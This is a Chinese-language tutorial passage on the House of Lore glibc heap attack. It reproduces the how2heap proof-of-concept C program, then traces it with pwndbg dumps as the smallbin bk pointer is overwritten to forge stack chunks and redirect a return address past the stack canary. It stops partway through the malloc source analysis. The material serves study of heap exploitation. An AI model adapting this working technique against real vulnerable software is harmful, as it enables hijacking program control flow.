# 前言
这一小节我们重新说明一下house of lore这种攻击方式，黑历史：

[PWN进阶（1-7-2）-smallbin_attack-House of Lore](https://www.yuque.com/cyberangel/rg9gdm/nd4xd5)

> 上面文章的内容最好别看，因为会污染你的眼睛。
>

总的来说，house of lore这种攻击方式主要是修改smallbin中free chunk的bk指针，因为在对smallbin free chunk解链时只检查了第一个堆块的双向链表的完整性并没有检查之后chunk的堆块链表完整性，这就导致了可以控制任意地址的内存。

# 适用版本
glibc版本< 2.31（该漏洞在最新的glibc中已经被封堵--how2heap--这里存疑？？？）

# POC
## POC源码
```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};
  void* fake_freelist[7][4];

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  fprintf(stderr, "Allocating dummy chunks for using up tcache later\n");
  void *dummies[7];
  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake free-list on the stack\n");
  for(int i=0; i<6; i++) {
    fake_freelist[i][3] = fake_freelist[i+1];
  }
  fake_freelist[6][3] = NULL;
  fprintf(stderr, "fake free-list at %p\n", fake_freelist);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, "Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "
          "introduced by smallbin-to-tcache mechanism\n");
  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing dummy chunk\n");
  for(int i=0; i<7; i++) free(dummies[i]);
  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------
  fprintf(stderr, "Now take all dummies chunk in tcache out\n");
  for(int i=0; i<7; i++) malloc(0x100);


  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(0x100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100);
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot);
}
```

## POC分析
首先我们申请了一个大小属于smallbin中的chunk，在POC中这里选择创建大小为0x100的堆块（b 47->r）：

```c
  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);
#Welcome to the House of Lore
#This is a revisited version that bypass also the hardening check introduced by glibc malloc
#This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27
#
#Allocating the victim chunk
#Allocated the first small chunk on the heap at 0x555555757260
```

```c
pwndbg> x/120gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim
......
0x555555757360:	0x0000000000000000	0x0000000000020ca1 #top_chunk
......
0x5555557573b0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来我们再次malloc7个与刚才大小相同的堆块（b 52->c），这里创建7个堆块的目的是在后续释放过程中用来填满对应大小的tcachebin链表：

```c
  fprintf(stderr, "Allocating dummy chunks for using up tcache later\n");
  void *dummies[7];
  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
```

```c
pwndbg> x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim
.......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk_dummy[0]
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1]
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2]
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3]
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4]
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5]
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6]
.......
0x555555757ad0:	0x0000000000000000	0x0000000000020531 #top_chunk
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

此时的stack_buffer_1和stack_buffer_2的起始地址如下（b 57->c）:

```c
  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);
#stack_buffer_1 at 0x7fffffffdca0
#stack_buffer_2 at 0x7fffffffdc80
```

```c
pwndbg> x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim
				#victim_chunk==0x555555757250
.......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk_dummy[0]
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1]
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2]
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3]
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4]
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5]
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6]
.......
0x555555757ad0:	0x0000000000000000	0x0000000000020531 #top_chunk
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> x/30gx fake_freelist 
0x7fffffffdd00:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd10:	0x00007ffff7b95707	0x0000000000000980
0x7fffffffdd20:	0x00007fffffffdd50	0x00007fffffffdd60
0x7fffffffdd30:	0x00007ffff7ffea98	0x0000000000000000
0x7fffffffdd40:	0x0000004000000000	0x0000040000000200
0x7fffffffdd50:	0x00000000ffffffff	0x0000000000000000
0x7fffffffdd60:	0x00007ffff7ffb2a8	0x00007ffff7ffe710
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
0x7fffffffdd80:	0x0000000000000000	0x0000000000000000
0x7fffffffdd90:	0x0000000000000009	0x00007ffff7dd5660
0x7fffffffdda0:	0x00007fffffffde08	0x00000000000000f0
0x7fffffffddb0:	0x0000000000000001	0x000055555555502d
0x7fffffffddc0:	0x00007ffff7de3b40	0x0000000000000000
0x7fffffffddd0:	0x0000555555554fe0	0x0000555555554760
0x7fffffffdde0:	0x00007fffffffded0	0xe5db78355322cc00
pwndbg> 
```

然后我们在stack上创建fake free-list（b 64->c），至于这样创建的原因之后再说：

```c
  fprintf(stderr, "Create a fake free-list on the stack\n");
  for(int i=0; i<6; i++) {
    fake_freelist[i][3] = fake_freelist[i+1];
  }
  fake_freelist[6][3] = NULL;
  fprintf(stderr, "fake free-list at %p\n", fake_freelist);
#Create a fake free-list on the stack
#fake free-list at 0x7fffffffdd00
```

```c
pwndbg> info local
stack_buffer_1 = {0x0, 0x0, 0x0, 0x0}
stack_buffer_2 = {0x0, 0x0, 0x0}
fake_freelist = {{0x0, 0x7ffff7ffe710, 0x7ffff7b95707, 0x7fffffffdd20}, {0x7fffffffdd50, 0x7fffffffdd60, 0x7ffff7ffea98, 0x7fffffffdd40}, {0x4000000000, 0x40000000200, 0xffffffff, 0x7fffffffdd60}, {0x7ffff7ffb2a8, 0x7ffff7ffe710, 0x0, 0x7fffffffdd80}, {0x0, 0x0, 0x9, 0x7fffffffdda0}, {0x7fffffffde08, 0xf0, 0x1, 0x7fffffffddc0}, {0x7ffff7de3b40 <_dl_fini>, 0x0, 0x555555554fe0 <__libc_csu_init>, 0x0}}
victim = 0x555555757260
dummies = {0x555555757370, 0x555555757480, 0x555555757590, 0x5555557576a0, 0x5555557577b0, 0x5555557578c0, 0x5555557579d0}
victim_chunk = 0x555555757250
p5 = 0x7fffffffdd60
p2 = 0x3
p3 = 0x7fffffffdd50
p4 = 0x0
sc = 140737354117512
__PRETTY_FUNCTION__ = "main"
pwndbg> x/30gx fake_freelist 
0x7fffffffdd00:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd10:	0x00007ffff7b95707	0x00007fffffffdd20 #fake_freelist[0][3]
    								#changed
0x7fffffffdd20:	0x00007fffffffdd50	0x00007fffffffdd60
0x7fffffffdd30:	0x00007ffff7ffea98	0x00007fffffffdd40 #fake_freelist[1][3]
    								#changed
0x7fffffffdd40:	0x0000004000000000	0x0000040000000200
0x7fffffffdd50:	0x00000000ffffffff	0x00007fffffffdd60 #fake_freelist[2][3]
    								#changed
0x7fffffffdd60:	0x00007ffff7ffb2a8	0x00007ffff7ffe710
0x7fffffffdd70:	0x0000000000000000	0x00007fffffffdd80 #fake_freelist[3][3]
    								#changed
0x7fffffffdd80:	0x0000000000000000	0x0000000000000000
0x7fffffffdd90:	0x0000000000000009	0x00007fffffffdda0 #fake_freelist[4][3]
    								#changed
0x7fffffffdda0:	0x00007fffffffde08	0x00000000000000f0
0x7fffffffddb0:	0x0000000000000001	0x00007fffffffddc0 #fake_freelist[5][3]
    								#changed
0x7fffffffddc0:	0x00007ffff7de3b40	0x0000000000000000
0x7fffffffddd0:	0x0000555555554fe0	0x0000000000000000 #fake_freelist[6][3]
    								#changed
0x7fffffffdde0:	0x00007fffffffded0	0xe5db78355322cc00
pwndbg> 
```

接下来开始在stack_buffer_1上伪造fake_chunk（b 71->c）：

```c
  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;
```

```c
#修改前：
pwndbg>  x/16gx stack_buffer_1
0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcc0:	0x0000555555757370	0x0000555555757480
0x7fffffffdcd0:	0x0000555555757590	0x00005555557576a0
0x7fffffffdce0:	0x00005555557577b0	0x00005555557578c0
0x7fffffffdcf0:	0x00005555557579d0	0x0000000000000000
0x7fffffffdd00:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd10:	0x00007ffff7b95707	0x00007fffffffdd20
pwndbg> 
#修改后：
pwndbg> x/16gx stack_buffer_1
0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
    			#stack_buffer_1[0]  #stack_buffer_1[1]
0x7fffffffdcb0:	0x0000555555757250	0x0000000000000000
    			#stack_buffer_1[2]
0x7fffffffdcc0:	0x0000555555757370	0x0000555555757480
0x7fffffffdcd0:	0x0000555555757590	0x00005555557576a0
0x7fffffffdce0:	0x00005555557577b0	0x00005555557578c0
0x7fffffffdcf0:	0x00005555557579d0	0x0000000000000000
0x7fffffffdd00:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd10:	0x00007ffff7b95707	0x00007fffffffdd20
pwndbg> 
```

之后我们再次设置stack_buffer_1和stack_buffer_2（b 81->c）：

```c
  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, "Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "
          "introduced by smallbin-to-tcache mechanism\n");
  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
```

```c
#修改前：
pwndbg>  x/16gx stack_buffer_2
0x7fffffffdc80:	0x0000000000000000	0x0000000000000000
0x7fffffffdc90:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcc0:	0x0000555555757370	0x0000555555757480
0x7fffffffdcd0:	0x0000555555757590	0x00005555557576a0
0x7fffffffdce0:	0x00005555557577b0	0x00005555557578c0
0x7fffffffdcf0:	0x00005555557579d0	0x0000000000000000
pwndbg> 
#修改后：
pwndbg> x/16gx stack_buffer_2
0x7fffffffdc80:	0x0000000000000000	0x0000000000000000
0x7fffffffdc90:	0x00007fffffffdca0	0x00007fffffffdd00
    			#stack_buffer_2[2]  #stack_buffer_2[3]
0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcb0:	0x0000555555757250	0x00007fffffffdc80
0x7fffffffdcc0:	0x0000555555757370	0x0000555555757480
0x7fffffffdcd0:	0x0000555555757590	0x00005555557576a0
0x7fffffffdce0:	0x00005555557577b0	0x00005555557578c0
0x7fffffffdcf0:	0x00005555557579d0	0x0000000000000000
pwndbg> x/16gx stack_buffer_1
0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcb0:	0x0000555555757250	0x00007fffffffdc80
    								#stack_buffer_1[3]	
    								#changed
0x7fffffffdcc0:	0x0000555555757370	0x0000555555757480
0x7fffffffdcd0:	0x0000555555757590	0x00005555557576a0
0x7fffffffdce0:	0x00005555557577b0	0x00005555557578c0
0x7fffffffdcf0:	0x00005555557579d0	0x0000000000000000
0x7fffffffdd00:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd10:	0x00007ffff7b95707	0x00007fffffffdd20
pwndbg> 

```

这里我们伪造了stack_buffer_1和stack_buffer_2，stack_buffer_1是为了之后修改smallbin的bk指针到此处，stack_buffer_2主要是连接之后的fake_free_list；做着两步都是为了之后在malloc smallbin中的free chunk时绕过检查因为之前修改了bk指针。接下来我们创建malloc(1000)的堆块~~防止在free时对之前malloc出的堆块造成影响（主要考虑top_chunk）~~（b 87->c）：

```c
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);
```

```c
pwndbg> x/500gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim
				#victim_chunk==0x555555757250
.......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk_dummy[0]
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1]
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2]
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3]
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4]
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5]
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6]
.......
0x555555757ad0:	0x0000000000000000	0x00000000000003f1 #large_chunk--malloc(1000)--p5
......
0x555555757ec0:	0x0000000000000000	0x0000000000020141 #top_chunk
......
0x555555757f90:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

下面的代码开始对POC开头创建的chunk_dummies进行free以填充满对应大小链表的tcachebin，完成free之后free chunk_victim（b 92->c）：

```c
  fprintf(stderr, "Freeing dummy chunk\n");
  for(int i=0; i<7; i++) free(dummies[i]);
  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);
#Freeing dummy chunk
#Freeing the chunk 0x555555757260, it will be inserted in the unsorted bin
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620986290875-8aced23b-0f61-4100-93f0-095906a98fd3.png)

如上图所示，chunk_victim现在已经进入到了unsortedbin中，此时的内存状况如下：

```c
pwndbg> x/500gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
.......
0x5555557570c0:	0x0000000000000000	0x00005555557579d0
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-unsortedbin)
0x555555757260:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
				#victim_chunk==0x555555757250
.......
0x555555757360:	0x0000000000000110	0x0000000000000111 #chunk_dummy[0](free-tcachebin)
0x555555757370:	0x0000000000000000	0x0000555555757010
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1](free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2](free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3](free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4](free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5](free-tcachebin)
0x5555557578c0:	0x00005555557577b0	0x0000555555757010
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6](free-tcachebin)
0x5555557579d0:	0x00005555557578c0	0x0000555555757010
.......
0x555555757ad0:	0x0000000000000000	0x00000000000003f1 #large_chunk--malloc(1000)--p5
......
0x555555757ec0:	0x0000000000000000	0x0000000000020141 #top_chunk
......
0x555555757f90:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

printf一些消息（b 99->c）：

```c
  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

#In the unsorted bin the victim's fwd and bk pointers are nil
#victim->fwd: 0x7ffff7dcdca0
#victim->bk: 0x7ffff7dcdca0

#Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
#This means that the chunk 0x555555757260 will be inserted in front of the SmallBin
```

然后malloc(1200)一个堆块，这个堆块的作用是将在unsortedbin中的chunk_victim移入到smallbin中（b 108->c）：

```c
  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
#The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x555555757ed0
#The victim chunk has been sorted and its fwd and bk pointers updated
#victim->fwd: 0x7ffff7dcdda0
#victim->bk: 0x7ffff7dcdda0
```

> 如果这里不明白malloc之后chunk_victim移入到smallbin的原因，建议翻一下malloc源码，着重看_int_malloc函数。
>

此时的内存状况如下：

```c
pwndbg> x/650gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
.......
0x5555557570c0:	0x0000000000000000	0x00005555557579d0
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-smallbin)
0x555555757260:	0x00007ffff7dcdda0	0x00007ffff7dcdda0
				#victim_chunk==0x555555757250
.......
0x555555757360:	0x0000000000000110	0x0000000000000111 #chunk_dummy[0](free-tcachebin)
0x555555757370:	0x0000000000000000	0x0000555555757010
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1](free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2](free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3](free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4](free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5](free-tcachebin)
0x5555557578c0:	0x00005555557577b0	0x0000555555757010
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6](free-tcachebin)
0x5555557579d0:	0x00005555557578c0	0x0000555555757010
.......
0x555555757ad0:	0x0000000000000000	0x00000000000003f1 #large_chunk--malloc(1000)--p5
......
0x555555757ec0:	0x0000000000000000	0x00000000000004c1 #large_chunk--malloc(1200)--p2
......
0x555555758380:	0x0000000000000000	0x000000000001fc81 #top_chunk
......
0x555555758440:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

# ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620987321869-bd5b3ea8-c109-4ac7-b20f-8941f4363e5b.png)
假如说现在有个漏洞（如堆溢出或UAF之类的）可以修改chunk_victim的**<font style="color:#F5222D;">bk指针</font>**（b 113->c）：

> 这里我们将bk指针篡改到stack_buffer_1
>

```c
  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------
```

```c
pwndbg> x/650gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
.......
0x5555557570c0:	0x0000000000000000	0x00005555557579d0
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-smallbin)
0x555555757260:	0x00007ffff7dcdda0	0x00007fffffffdca0
    								#changed
				#victim_chunk==0x555555757250
.......
0x555555757360:	0x0000000000000110	0x0000000000000111 #chunk_dummy[0](free-tcachebin)
0x555555757370:	0x0000000000000000	0x0000555555757010
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1](free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2](free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3](free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4](free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5](free-tcachebin)
0x5555557578c0:	0x00005555557577b0	0x0000555555757010
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6](free-tcachebin)
0x5555557579d0:	0x00005555557578c0	0x0000555555757010
.......
0x555555757ad0:	0x0000000000000000	0x00000000000003f1 #large_chunk--malloc(1000)--p5
......
0x555555757ec0:	0x0000000000000000	0x00000000000004c1 #large_chunk--malloc(1200)--p2
......
0x555555758380:	0x0000000000000000	0x000000000001fc81 #top_chunk
......
0x555555758440:	0x0000000000000000	0x0000000000000000
pwndbg> 
```



![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621168960823-dd0276b0-5138-4187-be45-94785a74f7fd.png)![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620987646176-216f7ffe-d2ca-40a8-8d24-d4cec0bdaa79.png)

如上图所示，现在smallbin的0x110链表出现了异常（corrupted），这里先不用管，我们先清空tcachebin再说（b 117->c）：

```c
  fprintf(stderr, "Now take all dummies chunk in tcache out\n");
  for(int i=0; i<7; i++) malloc(0x100);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620987693974-4aa6e7b7-8e80-4f3d-9ba6-ce373a933808.png)

```c
pwndbg> x/650gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
.......
0x5555557570c0:	0x0000000000000000	0x00005555557579d0
.......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-smallbin)
0x555555757260:	0x00007ffff7dcdda0	0x00007fffffffdca0 #（corrupted）
				#victim_chunk==0x555555757250
.......
0x555555757360:	0x0000000000000110	0x0000000000000111 #chunk_dummy[0](malloc)
.......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk_dummy[1](malloc)
.......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk_dummy[2](malloc)
.......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk_dummy[3](malloc)
.......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[4](malloc)
.......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[5](malloc)
.......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_dummy[6](malloc)
.......
0x555555757ad0:	0x0000000000000000	0x00000000000003f1 #large_chunk--malloc(1000)--p5
......
0x555555757ec0:	0x0000000000000000	0x00000000000004c1 #large_chunk--malloc(1200)--p2
......
0x555555758380:	0x0000000000000000	0x000000000001fc81 #top_chunk
......
0x555555758440:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

下述代码中的malloc(0x100)是我们这篇文章中研究的重点，这里需要引入malloc源码进行调试：

```c
  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(0x100);
```

这里直接调试到_int_malloc函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621000082565-e81a4984-5bdf-4538-854a-95605d989e7c.png)

经过一些过程之后会来到：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621001108176-a0765340-4cad-4485-80e3-cd4e82032e3f.png)

我们这里再复习一下这里的malloc，house of lore的问题主要出现在这里：

```c
  /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb)) //nb==0x110
    {
      idx = smallbin_index (nb); //idx==17
